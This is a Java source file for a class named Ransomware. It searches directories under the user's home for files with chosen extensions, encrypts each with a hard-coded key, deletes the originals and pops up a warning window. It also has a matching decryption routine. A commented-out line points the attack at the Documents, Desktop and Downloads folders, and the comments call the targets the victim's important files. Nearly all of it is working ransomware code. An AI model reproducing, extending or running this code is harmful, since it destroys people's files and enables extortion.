import org.apache.commons.io.FileUtils;

import javax.swing.*;
import java.io.File;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

public class Ransomware {

    /**
     * stores path of encrypted files
     */
    protected static final List<String> encryptedFiles = new LinkedList<>();

    public static void main(String[] args) {
        var targetDirectories = getTargetDirectories();
        List<File> files = fileFinder(targetDirectories);
        encryptAll(files);
        warning();
    }

    private static void encryptAll(List<File> files) {
        files.parallelStream().forEach(file -> {
            try {
                encryptor(file.getAbsolutePath());
            } catch (CryptoException e) {
                throw new RuntimeException(e);
            }
        });
    }

    /**
     * target directories to start the file encryption
     * @return list of directories
     */
    private static List<String> getTargetDirectories() {
        var userHome = System.getProperties().get("user.home");
        //return List.of(userHome + "/Documents", userHome + "/Desktop", userHome + "/Downloads");
        return List.of(userHome + "/Desktop/Unix 2");
    }

    private static void decryptor(String path) throws CryptoException {
        File file = new File(path  + Constants.SUFFIX);
        File decFile = new File(path);
        CryptoUtils.decrypt(Constants.SECRET_KEY, file, decFile);
        file.delete();
    }

    private static void warning() {
        SwingUtilities.invokeLater(() -> new WarningForm().setVisible(true));
    }

    /**
     * Encrypts the file at the path provided
     * @param path absolute path to file
     * @throws CryptoException
     */
    private static void encryptor(String path) throws CryptoException {
        File file = new File(path);
        synchronized (Ransomware.class){
            encryptedFiles.add(path);
        }
        File encFile = new File(path + Constants.SUFFIX);
        CryptoUtils.encrypt(Constants.SECRET_KEY, file, encFile);
        file.delete();
    }

    /**
     * finds important files on victim's machine
     *
     * @return
     */
    private static List<File> fileFinder(List<String> targetDirectories) {

        List<File> targetFiles = new ArrayList<>();

        targetDirectories.parallelStream().forEach(d -> {
            try {
                File root = new File(d);
                var files = FileUtils.listFiles(root, Constants.EXTENSIONS, true);
                targetFiles.addAll(files);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        return targetFiles;
    }

    public static void decryptAll() throws CryptoException {
        var iterator = encryptedFiles.iterator();
        while ( iterator.hasNext() ) {
            var file = iterator.next();
            Thread.ofVirtual().start(() -> {
                try {
                    decryptor(file);
                    synchronized (Ransomware.class){
                        encryptedFiles.remove(file);
                    }
                } catch (CryptoException e) {
                    throw new RuntimeException(e);
                }
            });
        }
    }
}